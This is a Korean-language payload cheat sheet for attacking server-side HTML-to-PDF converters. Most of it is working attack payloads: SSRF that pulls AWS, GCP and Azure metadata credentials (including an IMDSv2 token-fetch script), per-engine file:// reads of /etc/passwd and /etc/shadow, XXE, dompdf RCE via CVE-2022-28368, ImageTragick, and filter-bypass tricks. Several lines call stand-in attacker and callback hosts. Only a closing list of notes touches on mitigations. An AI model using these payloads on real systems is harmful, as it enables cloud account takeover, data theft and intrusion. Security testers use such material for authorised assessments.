### 정찰 페이로드

#### 엔진 fingerprint

```bash
# 1. 정상 입력으로 PDF 생성 후 메타데이터 추출
curl -s -X POST "https://target/api/pdf/generate" -d 'content=test' -o /tmp/test.pdf
exiftool /tmp/test.pdf | grep -iE "Creator|Producer|Author"
# 예: "Producer: wkhtmltopdf 0.12.6", "Producer: Skia/PDF m110", "Producer: dompdf 1.x"

# 2. PDF 텍스트 추출 (HTML 처리 결과 확인용)
pdftotext /tmp/test.pdf -
```

| Producer 문자열 | 엔진 |
|---|---|
| `wkhtmltopdf` | wkhtmltopdf (WebKit 기반) |
| `Skia/PDF` | puppeteer/Chrome headless |
| `WeasyPrint` | WeasyPrint (Python) |
| `dompdf` | dompdf (PHP) |
| `mPDF` | mPDF (PHP) |
| `iText`/`iText 7` | iText (Java) |
| `Apache FOP` | Flying Saucer / FOP (Java) |
| `xhtml2pdf` | xhtml2pdf/pisa (Python) |
| `IronPdf` | IronPDF (.NET) |

---

### 기본 페이로드

#### `JS_EXEC` (puppeteer/headless Chrome 한정)

```html
<!-- PDF에 결과 캡처되면 확인 -->
<script>document.write("JS_EXECUTED_"+Date.now())</script>

<!-- 내부 fetch → DOM → PDF -->
<div id=x></div>
<script>
fetch("http://127.0.0.1:8080/").then(r=>r.text()).then(t=>document.getElementById("x").innerText=t.substring(0,2000))
</script>

<!-- 외부 OOB callback -->
<script>fetch("https://CALLBACK.oast.fun/js-exec-"+Date.now())</script>
```

#### `SSRF`

공통 (모든 엔진):
```html
<img src="https://CALLBACK.oast.fun/ssrf-pdf">
<link rel="stylesheet" href="https://CALLBACK/css">
<style>@import url(https://CALLBACK/css-import);</style>
<svg><image href="https://CALLBACK/svg"/></svg>
<svg><filter id="x"><feImage href="https://CALLBACK/svg-filter"/></filter></svg>
```

Cloud metadata:
```html
<!-- AWS -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width=800 height=600></iframe>
<img src="http://169.254.169.254/latest/meta-data/" width=600 height=400>

<!-- AWS IMDSv2 (puppeteer/JS 가능 환경) -->
<script>
fetch("http://169.254.169.254/latest/api/token",{method:"PUT",headers:{"X-aws-ec2-metadata-token-ttl-seconds":"21600"}})
.then(r=>r.text()).then(t=>fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/",{headers:{"X-aws-ec2-metadata-token":t}}).then(r=>r.text()).then(t=>document.body.innerText=t))
</script>

<!-- GCP metadata -->
<iframe src="http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" width=800 height=400></iframe>

<!-- Azure -->
<iframe src="http://169.254.169.254/metadata/instance?api-version=2021-02-01" width=800 height=400></iframe>
```

내부 네트워크:
```html
<img src="http://127.0.0.1:6379/" width=600 height=400>
<img src="http://10.0.0.1/admin" width=600 height=400>
<iframe src="http://prometheus:9090/api/v1/query?query=up" width=800 height=600></iframe>
```

#### `LFI`

엔진별 페이로드:

| 엔진 | 페이로드 |
|---|---|
| wkhtmltopdf (`--enable-local-file-access` 또는 default) | `<img src="file:///etc/passwd">`, `<iframe src="file:///etc/hostname">`, `<embed src="file:///etc/passwd">` |
| WeasyPrint | `<img src="file:///etc/passwd">`, `<link rel="stylesheet" href="file:///etc/passwd">` (CSS as text) |
| puppeteer/Chrome (`--allow-file-access-from-files`) | `<iframe src="file:///etc/passwd">`, `<script>fetch("file:///etc/passwd").then(r=>r.text()).then(t=>document.body.innerText=t)</script>` |
| Flying Saucer | `<img src="file:///etc/passwd">`, `<img src="//attacker/redir-to-file">` (302 redirect to file://) |
| iText | `<img src="file:///etc/passwd">`, XInclude `<xi:include href="file:///etc/passwd"/>` |
| xhtml2pdf | `<pdf:link href="file:///etc/passwd">click</pdf:link>`, `<img src="/etc/passwd">` (file 스킴 없이도 처리) |
| dompdf | `<img src="file:///etc/passwd">`, `<style>@font-face{font-family:x;src:url("file:///etc/passwd");}</style>` |
| mPDF | `<htmlpageheader><watermarkimage src="file:///etc/passwd"/></htmlpageheader>` |
| pd4ml | `<annotation file="/etc/passwd" content="/etc/passwd" icon="Graph" title="x"/>` |
| IronPDF | `<img src="file:///etc/passwd">` (default 허용) |

CSS via attribute:
```html
<div style="background:url('file:///etc/passwd')"></div>
<div style="background-image:url(file:///etc/passwd)"></div>
```

#### `RCE`

dompdf < 2.0.2 (CVE-2022-28368):
```html
<style>
@font-face {
  font-family: x;
  src: url("php://filter/resource=/etc/passwd");
}
</style>
<!-- attacker가 /usr/share/fonts에 .ttf 위장 PHP shell 배치 후 트리거 -->
```

dompdf SSRF + JS injection:
```html
<style>@import url("https://attacker.com/payload.css");</style>
<!-- payload.css 안에 잘못된 @font-face 트리거 -->
```

ImageMagick (이미지 변환 결합 — `<img>` 처리에 IM 사용 시):
```
<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><image xlink:href='url(http://CALLBACK)'/></svg>">

<!-- ImageTragick CVE-2016-3714 — MVG/SVG 입력 -->
push graphic-context
viewbox 0 0 640 480
fill 'url(https://CALLBACK/imgtragick)'
pop graphic-context
```

iText XXE (XHTML 파싱 시):
```html
<?xml version="1.0"?>
<!DOCTYPE html [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<html><body>&xxe;</body></html>
```

puppeteer `--no-sandbox` 컨테이너 탈출 (영향도 격상):
```html
<!-- Chrome renderer escape PoC는 1day exploit 의존 — sandbox 탈출 PoC는 환경별 -->
<script>
// V8 0day가 있을 때만 의미. 일반 점검은 --no-sandbox 운영 환경 자체를 영향도 격상으로 보고
</script>
```

#### `PDF_JS_ANNOTATION` (PDF 뷰어에서 실행)

```html
<!-- xhtml2pdf, iText 등 PDF action 임베드 가능 엔진 한정 -->
<a href="javascript:app.alert('PDF_JS')" >click</a>

<!-- iText action -->
<button onclick="this.gotoNamedDest('Action_OpenURL')">trigger</button>
```

Adobe Reader 등 PDF 뷰어에서 열면 alert 발화 — 클라이언트 영향.

#### Markdown → HTML → PDF 체인

```markdown
<!-- marked/markdown-it `html: true` 옵션이면 raw HTML 통과 -->
<script>fetch("https://CALLBACK/md")</script>

<img src="file:///etc/passwd">

[link](javascript:alert(1))
```

---

### 우회 페이로드

| 방어 | 페이로드 |
|---|---|
| HTML sanitize (DOMPurify/sanitize-html) | CSS 미점검 시 `@import url(file://)`, SVG `<image href="file://">`, `<style>` 안 selector 변형 |
| wkhtmltopdf `--disable-local-file-access` | 외부 HTTP fetch 여전 — `--disable-javascript` + 네트워크 격리 필요. redirect로 file:// 우회 일부 환경 |
| puppeteer `setRequestInterception(true)` | `data:` URL, redirect chain (302→file://), Service Worker intercept 우회 |
| 네트워크 egress 차단 | 허용된 내부 리소스 (prometheus, grafana, 내부 API)는 allowlist면 접근 |
| `file://` 스킴만 차단 | `php://filter/resource=`, `gopher://`, `dict://`, `jar://`, `netdoc://`, `phar://` 누락 |
| puppeteer sandbox 활성화 | `--no-sandbox` 잔존 시 컨테이너 탈출 위험 (영향도 격상) |
| Markdown sanitize | marked `html: true`/`sanitize: false`면 `<script>` 직접 삽입 가능 |
| dompdf 2.x 업그레이드 | `@font-face src: url(http://attacker/.htaccess)` 같은 file confusion 잔존 — 옵션 점검 |
| WeasyPrint `url_fetcher` 차단 | URL fetcher가 `file://` 차단해도 `localhost`/`127.0.0.1`/`[::1]`/`0.0.0.0`/IPv4 short form (`127.1`) 누락 |
| 요청 IP 화이트리스트 | DNS rebinding (`CALLBACK.oast.fun` 응답이 internal IP로 회귀) |

#### Blind LFI/SSRF — 응답 PDF에 결과 안 보일 때

```html
<!-- 1. OAST 콜백만 활용 -->
<img src="https://CALLBACK.oast.fun/blind-lfi-attempt-$(date +%s)">

<!-- 2. file 존재 여부 oracle (404 vs 200 응답 시간/크기 차이) -->
<img src="file:///etc/passwd">  <!-- 존재 -->
<img src="file:///etc/no-such-file-12345">  <!-- 부재 -->
<!-- 두 PDF 크기/생성시간 비교 -->

<!-- 3. PDF에 에러 메시지 노출 oracle -->
<img src="file:///etc/shadow">
<!-- weasyprint는 read 실패 시 placeholder 이미지, 일부는 에러 메시지 노출 -->
```

---

### 참고사항

- HTML→PDF 변환기가 sink — 직접 PDF 생성 라이브러리(pdfkit/reportlab/pdf-lib)는 안전
- 엔진 fingerprint를 PDF 메타데이터(`exiftool`)로 먼저 식별 → 엔진별 페이로드 적용
- wkhtmltopdf, puppeteer, WeasyPrint가 가장 흔한 엔진 — 각각 다른 LFI/SSRF 차단 옵션
- dompdf는 사용자 입력 → RCE 사례 다수 (CVE-2022-28368) — 버전 확인 필수
- puppeteer `--no-sandbox` 운영 환경은 컨테이너 탈출 게이트 (V8 0day 있을 때 효과)
- CSP는 서버 puppeteer에 적용 안 됨 — 브라우저 CSP 무의미
- 결과 PDF가 다른 사용자에게 발송되면 stored exfiltration 영향도
- Markdown → HTML → PDF 체인도 동일 위험 (marked `html: true` / `sanitize: false`)
- 격리 컨테이너 + 네트워크 egress 차단은 영향 최소화에 가장 효과적 (옵션 단위 차단은 개별 스킴 잔존 가능)
- XSS → PDF 서버 렌더 체인은 blind SSRF/LFI 게이트로 자주 활용
- AWS metadata가 가장 큰 영향 (IAM credential → 계정 takeover) — ssrf-scanner 결합
- IMDSv2 환경은 PUT request 가능한 puppeteer/JS 환경에서만 토큰 획득 가능 (wkhtmltopdf는 GET only)
- PDF annotation `/JavaScript` action은 PDF 뷰어에서 실행 — Adobe Reader 등
- SVG `<filter>`/`<feImage>`는 sanitize 우회 + 외부 fetch 게이트
- `<embed>`/`<object>`/`<iframe>` 모두 file:// 스킴 sink — 차단 누락 시 LFI
- 영수증/인보이스 자동 생성은 사용자 입력(이름/주소/메모)이 sink로 가장 흔함
- PDF에 결과 캡처가 안 보이면 OAST 콜백으로 SSRF만 확인 (Blind), 또는 응답 크기/시간 diff oracle
- xhtml2pdf의 `<pdf:link>`, mPDF의 `<htmlpageheader>`/`<watermarkimage>`, pd4ml의 `<annotation>` 등 엔진별 sink 태그가 sanitize 통과
- Flying Saucer는 `_userAgentCallback` 미설정 시 default가 모든 URL fetch 허용
- iText의 XHTML 파싱은 XXE 게이트가 됨 — XML 파서 옵션 점검 필요
